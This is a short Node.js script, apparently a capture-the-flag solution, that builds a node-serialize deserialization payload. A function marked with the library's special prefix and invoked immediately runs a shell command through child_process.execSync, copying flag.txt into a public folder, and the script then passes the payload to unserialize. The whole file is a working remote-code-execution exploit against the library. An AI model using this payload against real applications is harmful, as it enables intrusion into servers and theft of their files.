const serialize = require('node-serialize');
const payloadObj = {
  username: "admin",
  role: "admin",
  rce: "_$$ND_FUNC$$_function(){require('child_process').execSync('cp flag.txt public/flag.txt')}()"
};
const serialized = JSON.stringify(payloadObj);
console.log("Serialized payload:", serialized);
try {
  const result = serialize.unserialize(serialized);
  console.log("Deserialized result:", result);
} catch (e) {
  console.error("Error during deserialization:", e);
}
